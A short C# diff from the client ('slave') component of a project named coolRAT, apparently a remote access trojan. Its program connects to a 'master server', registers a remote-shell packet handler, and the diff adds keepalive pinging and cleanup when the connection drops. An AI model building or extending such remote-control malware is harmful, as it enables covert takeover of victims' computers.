@@ -23,8 +23,23 @@ namespace coolRAT.Slave
             Globals.LocalClient = authClient.CreateClient(authClient.RegisterClient());
             Console.WriteLine("Connected!");
             Globals.LocalClient.RegisterPacketHandler("ConnectShellPacket", Shell_PacketReceivedHandler);
+            Globals.LocalClient.ClientPingService.Start(PingServiceType.Active);
+            Globals.LocalClient.ClientPingService.ConnectionLost += ClientPingService_ConnectionLost;
             Application.Run();
             return;
+        }
+
+        private static void ClientPingService_ConnectionLost(object sender, ConnectionLostEventArgs e)
+        {
+            Console.WriteLine("Lost connection to the master server!");
+            if(Globals.ShellInstance != null)
+                Globals.ShellInstance.Stop();
+            if(Globals.LocalClient != null)
+            {
+                Globals.LocalClient.Connection.StopAll();
+                Globals.LocalClient.ClientPingService.Stop();
+                Globals.LocalClient = null;
+            }
         }
 
         public static void Shell_PacketReceivedHandler(object sender, PacketReceivedEventArgs e)
